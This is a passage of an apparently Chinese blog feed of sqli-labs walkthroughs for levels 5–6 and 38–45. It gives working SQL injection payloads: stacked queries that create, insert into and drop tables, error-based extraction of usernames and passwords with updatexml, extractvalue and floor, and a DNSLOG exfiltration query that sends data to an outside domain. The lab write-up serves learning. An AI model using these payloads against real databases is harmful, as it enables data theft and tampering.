    <content><![CDATA[<h3 id="读文件——DNSLOG外带"><a href="#读文件——DNSLOG外带" class="headerlink" title="读文件——DNSLOG外带"></a>读文件——DNSLOG外带</h3><p>使用网站<a href="http://dnslog.cn/">http://dnslog.cn/</a></p>
<h4 id="UNC路径-只存在windows系统"><a href="#UNC路径-只存在windows系统" class="headerlink" title="UNC路径(只存在windows系统)"></a>UNC路径(只存在windows系统)</h4><p>格式：\servername\sharename,其中severname是服务器名，sharename是共享资源的名称。<br><code>?id=1&#39;;select 1,2,LOAD_FILE(group_concat(&#39;\\\\&#39;),mysql查询语句,&#39;域名\\abc&#39;)</code><br>第一个相当于转义两个\,可以把想要的信息放在子域名。</p>
<h3 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h3><p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</strong></p>
<p>复习一下，调用数据库时，可以不加；</p>
<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p>通过与注入点加;分隔开加新的注入。<br>打开后台数据库检验。<br>创表<br><code>?id=1&#39;;create table test like users--+</code><br><img src="38.md/1.png"><br><img src="38.md/0.png"></p>
<p>还可以直接用MySQL语句创表：<br><code>?id=1&#39;;insert into users(id,username,password)values(16,&#39;fafu&#39;,&#39;fafu&#39;)--+</code>记得字符要加单引号或者双引号。<br><img src="38.md/2.png"><br><code>?id=1&#39;;create table test like aaa;</code>后面加分号也可以的。<br><code>?id=1&#39;;drop table test--+</code><br><strong>补充：这里创表需要加like users 是因为创表需要知道字段名还有字段类型。</strong></p>
<h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><p>为数字型，也是堆叠注入。</p>
<h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><p>改成’)即可</p>
<h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>也是数字型注入,错误不回显，盲注。</p>
<h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>这里和24关有点相似，我们尝试创建新用户，失败了，被发现了。<br>看了一下源码，猜测注入点在password，开始尝试。创建新用户失败，用原来的账户密码登陆。<br>跳到改密码页面，把密码改成’#后缀的，再次用次密码登陆，登陆失败，嘿嘿嘿，注入点来了。<br>直接构造报错函数：<br><code>&#39; and updatexml(1,concat(0x7c,database()),1)#</code>，ok成功。<br><strong>堆叠注入</strong><br>在password构造，<br><code>1&#39;;create table test1 like users#</code>可以注入。<br>因为输入密码时是看不见的，这里建议，先写打在记事本上，在复制粘贴。</p>
<h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><p>改成’)即可。</p>
<h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>这一关没有报错信息，盲注</p>
<h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>也没有报错信息，可以盲注<br>看了大佬博客，以上关卡，也是堆叠注入类型的，通过在password上构造payload，这里不再赘述。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs5、6</title>
    <url>/2020/11/19/sqli-labs/5~6/</url>
    <content><![CDATA[<ul>
<li>导入：源码中有 print_f(mysql_error())<h3 id="报错注入型"><a href="#报错注入型" class="headerlink" title="报错注入型"></a>报错注入型</h3>  输入?id=1到17页面显示正常 大于18 页面显示异常，得出没有页面没有显示位，无法使用联合注入<br><img src="5~6.md/1.png"><br>  尝试加单引号，出现sql语句报错，使用：报错注入。<br><img src="5~6.md/2.png"></li>
</ul>
<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat(((查询语句)),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br>    可更改查询语句  获得其他数据,详细见双查询注入。</p>
<h4 id="updatexml函数报错注入"><a href="#updatexml函数报错注入" class="headerlink" title="updatexml函数报错注入"></a>updatexml函数报错注入</h4><p>语法：<br><code>updatexml(文档类型,xpath路径,更新的内容)</code><br>xpath路径写入其他格式就会报错，并返回我们写入的非法格式内容。<br><code>?id=1&#39; and updatexml (1,concat(0x7c,(select database())),1)--+</code> **0x7c后面的逗号不能漏。这里id的值影响不大但是单引号不能漏，不然不会报错。<br><img src="5~6.md/3.png"></p>
<p>补充：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">polygon函数替换updatexml</span><br><span class="line"></span><br><span class="line">select polygon((select*from(select*from*(select@@version)f)x))</span><br></pre></td></tr></table></figure>

<h4 id="extractvalue函数报错注入"><a href="#extractvalue函数报错注入" class="headerlink" title="extractvalue函数报错注入"></a>extractvalue函数报错注入</h4><p>语法：<br><code>extractvalue(文档类型，xpath路径)</code><br><code>?id=1&#39; and extractvalue(1,concat(0x7c,(查询语句)))</code>,<br><img src="5~6.md/4.png">    </p>
<h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p><code>?id=1&#39; and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</code><br><img src="5~6.md/7.png"></p>
<h3 id="第六关，”闭合型报错，使用报错语句注入即可。"><a href="#第六关，”闭合型报错，使用报错语句注入即可。" class="headerlink" title="第六关，”闭合型报错，使用报错语句注入即可。"></a>第六关，”闭合型报错，使用报错语句注入即可。</h3><p>*** 补充一下报错获取用户账户和秘密的代码。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select username from users limit 0,1)),1)--+</code><br><img src="5~6.md/5.png"><br>如果直接要直接查找username,password 记得使用concat进行连接。<br><code>?id=1&quot; and updatexml(1,concat(0x7c,(select concat(username,password)from users limit 0,1)),1)--+</code><br>但是结果也只能慢慢报出，所以一个个查也是可以的，因为长度过长。<br><img src="5~6.md/6.png"></p>
<p>对于报错注入长度限制：</p>
<p>我们可以使用函数substr、mid、substring进行截断：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7c,(select substr(concat(password),1,10)from &#x27;users&#x27; limit 0,1),0x7c),1)#</span><br></pre></td></tr></table></figure>



<ul>
<li>补充</